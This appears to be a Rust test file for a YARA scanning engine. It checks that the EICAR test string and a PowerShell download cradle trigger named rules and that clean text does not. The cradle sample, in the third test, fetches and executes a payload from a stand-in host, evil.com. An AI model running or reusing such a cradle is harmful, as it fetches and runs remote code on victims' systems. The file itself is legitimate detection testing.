use crate::detection::yara::YaraEngine;
use crate::models::ThreatSeverity;

#[test]
fn test_yara_initialization_and_eicar_match() {
    let yara = YaraEngine::new().expect("Failed to initialize YaraEngine");

    // Standard EICAR test string
    let eicar_string = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    let matches = yara.scan_bytes(eicar_string).expect("Scan failed");

    assert!(!matches.is_empty(), "EICAR string should trigger YARA rule");
    assert_eq!(matches[0].rule_name, "EICAR_Test_File");
    assert_eq!(matches[0].severity, ThreatSeverity::Critical);
}

#[test]
fn test_yara_clean_data_no_match() {
    let yara = YaraEngine::new().expect("Failed to initialize YaraEngine");
    let clean_data = b"This is a benign, clean text file containing no malware patterns.";
    let matches = yara.scan_bytes(clean_data).expect("Scan failed");

    assert!(matches.is_empty(), "Clean data should produce 0 YARA matches");
}

#[test]
fn test_yara_powershell_cradle_detection() {
    let yara = YaraEngine::new().expect("Failed to initialize YaraEngine");
    let ps_cradle = b"powershell.exe -enc aW52b2tlLWV4cHJlc3Npb24= (New-Object Net.WebClient).DownloadString('http://evil.com/payload')";
    let matches = yara.scan_bytes(ps_cradle).expect("Scan failed");

    assert!(!matches.is_empty());
    assert_eq!(matches[0].rule_name, "Suspicious_PowerShell_Cradle");
}
